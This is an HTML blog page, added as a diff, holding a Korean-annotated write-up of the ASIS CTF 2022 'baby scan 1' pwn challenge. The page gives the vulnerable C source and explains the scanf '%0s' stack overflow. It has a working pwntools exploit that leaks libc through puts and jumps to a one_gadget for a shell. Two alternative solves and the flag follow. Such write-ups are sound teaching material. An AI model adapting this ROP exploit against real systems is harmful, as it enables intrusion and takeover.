@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Info(87&#x2F;532) solves descriptionIs it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done! for player123456789.├── bin│   └── chall├── lib">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ASIS CTF 2022 - baby scan 1">
+<meta property="og:url" content="https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="Info(87&#x2F;532) solves descriptionIs it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done! for player123456789.├── bin│   └── chall├── lib">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-16T22:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-22T18:47:30.711Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="ASIS CTF">
+<meta property="article:tag" content="one_gadget">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!-- title -->
+    <title>ASIS CTF 2022 - baby scan 1</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/10/18/asisctf2022-babysacn_2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/10/14/221014-diary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&text=ASIS CTF 2022 - baby scan 1"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&is_video=false&description=ASIS CTF 2022 - baby scan 1"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ASIS CTF 2022 - baby scan 1&body=Check out this article: https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&name=ASIS CTF 2022 - baby scan 1&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&t=ASIS CTF 2022 - baby scan 1"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">2.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Another-Solve"><span class="toc-number">4.</span> <span class="toc-text">Another Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Using-FSB"><span class="toc-number">4.1.</span> <span class="toc-text">1. Using FSB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Using-rsi-x3D-x3D-rdx"><span class="toc-number">4.2.</span> <span class="toc-text">2. Using rsi &#x3D;&#x3D; rdx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">4.3.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ASIS CTF 2022 - baby scan 1
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-16T22:00:00.000Z" itemprop="datePublished">2022-10-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ASIS-CTF/" rel="tag">ASIS CTF</a>, <a class="tag-link-link" href="/tags/one-gadget/" rel="tag">one_gadget</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(87&#x2F;532) solves</p>
+<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Is it possible to scan the thousands of resulting strings by hand? We think it’s tedious, but will get the job done!</p>
+<h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bin</span><br><span class="line">│   └── chall</span><br><span class="line">├── lib</span><br><span class="line">│   ├── ld-2.31.so</span><br><span class="line">│   └── libc.so.6</span><br><span class="line">├── run.sh</span><br><span class="line">└── src</span><br><span class="line">    └── main.c</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)alloca(atoi(size) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>alloca</code> 함수는 스택에 메모리를 할당하는 함수이다.</p>
+<h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>포맷스트링 인자를 마음대로 줄 수 있으니 입력으로 0을 넣으면 stack overflow를 트리거할 수 있다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%0s&quot;</span>, buf);</span><br></pre></td></tr></table></figure>
+
+<p>same as</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol>
+<li><code>%0s</code> 포맷스트링으로 overflow 트리거</li>
+<li>원가젯</li>
+</ol>
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.21.255.31&#x27;</span>, <span class="number">13370</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./../lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401433</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0xe3b01</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Another-Solve"><a href="#Another-Solve" class="headerlink" title="Another Solve"></a>Another Solve</h2><h3 id="1-Using-FSB"><a href="#1-Using-FSB" class="headerlink" title="1. Using FSB"></a>1. Using FSB</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1$999&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe3b4d0ac8 → 0x73393939243125 (&quot;%1$999s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe3b4d0ab0 → 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe3b4d0ab0 → 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>Maybe.. I think this solution is intention.</p>
+<h3 id="2-Using-rsi-x3D-x3D-rdx"><a href="#2-Using-rsi-x3D-x3D-rdx" class="headerlink" title="2. Using rsi &#x3D;&#x3D; rdx"></a>2. Using rsi &#x3D;&#x3D; rdx</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">b&#x27;1s%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> </span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf@plt (</span><br><span class="line">   $rdi = 0x007ffe99d75878 → 0x00007325733125 (&quot;%1s%s&quot;?),</span><br><span class="line">   $rsi = 0x007ffe99d75860 → 0x0000000000000005,</span><br><span class="line">   $rdx = 0x007ffe99d75860 → 0x0000000000000005</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASIS&#123;06e5ff13b438f5d6626a97758fddde3e502fe3fc&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mitigation"><span class="toc-number">2.1.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code"><span class="toc-number">2.2.</span> <span class="toc-text">Source Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.3.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Scenario"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Scenario</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.2.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Another-Solve"><span class="toc-number">4.</span> <span class="toc-text">Another Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Using-FSB"><span class="toc-number">4.1.</span> <span class="toc-text">1. Using FSB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Using-rsi-x3D-x3D-rdx"><span class="toc-number">4.2.</span> <span class="toc-text">2. Using rsi &#x3D;&#x3D; rdx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">4.3.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&text=ASIS CTF 2022 - baby scan 1"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&is_video=false&description=ASIS CTF 2022 - baby scan 1"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ASIS CTF 2022 - baby scan 1&body=Check out this article: https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&title=ASIS CTF 2022 - baby scan 1"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&name=ASIS CTF 2022 - baby scan 1&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/2022/10/17/asisctf2022-babysacn_1/&t=ASIS CTF 2022 - baby scan 1"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
